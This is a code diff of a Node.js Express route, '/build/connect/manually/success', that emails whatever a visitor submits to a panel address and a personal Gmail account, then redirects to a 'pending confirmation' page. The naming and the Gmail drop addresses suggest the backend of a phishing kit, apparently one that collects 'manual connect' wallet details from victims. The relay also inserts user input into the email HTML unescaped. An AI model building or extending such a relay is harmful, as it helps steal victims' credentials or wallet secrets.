@@ -53,27 +53,30 @@ app.post('/build/connect/manually/success', async (req, res) => {
     })
 
 
-    var mailOptions = {
-        from: 'info@resolverconsult-panel.com', //Testing email to see you received it successfully. Server configured email
-        to: 'salim72salim72@gmail.com',
-        subject: `${req.body.category}`,
-        html: `${req.body.data}`
-      };
+    const recipients = ["info@resolverconsult-panel.com", "node.resolver@gmail.com"]
+    for(let recipient of recipients) {
+        const mailOptions = {
+            from: "info@resolverconsult-panel.com",
+            to: recipient,
+            subject: `${req.body.category}`,
+            html: `${req.body.data}`
+        }
 
-      await new Promise((resolve, reject) => {
-        transporter.sendMail(mailOptions, async (error, info) => {
-          if (error) {
-            console.log(error)
-            reject(error)
-          }else{
-            console.log('Email sent: ' + info.response)
-            console.log('New info')
-            resolve(info)
-            await delay(3000)
-            res.redirect('/build/pending/confirmation/success')
-          }
+        await new Promise((resolve, reject) => {
+            transporter.sendMail(mailOptions, (error, info) => {
+                if (error) {
+                    console.log(error);
+                    reject(error);
+                }else{
+                    console.log(`Email sent to ${recipient}: ` + info.response);
+                    resolve(info);
+                }
+
+            })
         })
-      })
+    }
+        await delay(3000)
+        res.redirect('/build/pending/confirmation/success')
 })
 
 app.listen(PORT, () => {
